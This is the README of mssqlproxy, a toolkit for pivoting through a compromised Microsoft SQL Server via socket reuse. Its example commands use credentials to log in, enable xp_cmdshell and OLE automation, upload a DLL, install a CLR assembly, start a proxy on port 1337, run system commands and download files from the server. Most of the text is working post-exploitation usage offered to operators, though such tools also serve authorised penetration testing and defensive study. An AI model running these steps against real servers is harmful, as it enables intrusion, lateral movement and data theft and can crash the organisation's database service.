# mssqlproxy

**mssqlproxy** is a toolkit aimed to perform lateral movement in restricted environments through a compromised Microsoft SQL Server via socket reuse. The client requires [impacket](https://github.com/SecureAuthCorp/impacket) and **sysadmin** privileges on the SQL server.


Please read [this article](https://www.blackarrow.net/mssqlproxy-pivoting-clr/) carefully before continuing.

```
proxy mode:
  -reciclador path      Remote path where DLL is stored in server
  -install              Installs CLR assembly
  -uninstall            Uninstalls CLR assembly
  -check                Checks if CLR is ready
  -start                Starts proxy
  -local-port port      Local port to listen on
  -clr local_path       Local CLR path
  -no-check-src-port    Use this option when connection is not direct (e.g. proxy)
```

We have also implemented two commands (within the SQL shell) for downloading and uploading files. Relating to the proxy stuff, we have four commands:

* **install**: Creates the CLR assembly and links it to a stored procedure. You need to provide the `-clr` param to read the generated CLR from a local DLL file.
* **uninstall**: Removes what **install** created.
* **check**: Checks if everything is ready to start the proxy. Requires to provide the server DLL location (`-reciclador`), which can be uploaded using the **upload** command.
* **start**: Starts the proxy. If `-local-port` is not specified, it will listen on port 1337/tcp.
[![asciicast](https://asciinema.org/a/298949.svg)](https://asciinema.org/a/298949)

**Note #1:** if using a non-direct connection (e.g. proxies in between), the `-no-check-src-port` flag is needed, so the server only checks the source address.

**Note #2:** at the moment, only IPv4 targets are supported (nor DNS neither IPv6 addresses).

**Note #3:** use carefully! by now the MSSQL service will crash if you try to establish multiple concurrent connections

**Important:** It's important to stop the mssqlproxy by pressing Ctrl+C on the client. If not, the server may crash and you will have to restart the MSSQL service manually.

Example
------------

Prepare
```bash
mv assembly.dll Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py $username:$password@$ip_mssql
SQL> enable_xp_cmdshell
SQL> enable_ole
SQL> upload reciclador.dll c:\windows\temp\reciclador.dll
SQL> exit
```

Proxy
```bash
python3 mssqlclient.py $username:$password@$ip_mssql -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py $username:$password@$ip_mssql -check -reciclador 'c:\programdata\reciclador.dll'
python3 mssqlclient.py $username:$password@$ip_mssql -start -reciclador 'c:\programdata\reciclador.dll'
```

xp_cmdshell
```bash
SQL> xp_cmdshell whoami /all
```
download file
```
download c:\xx.zip xx.zip
```


License
-------

All the code included in this project is licensed under the terms of the GPL license. The mssqlclient.py is based on [Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).
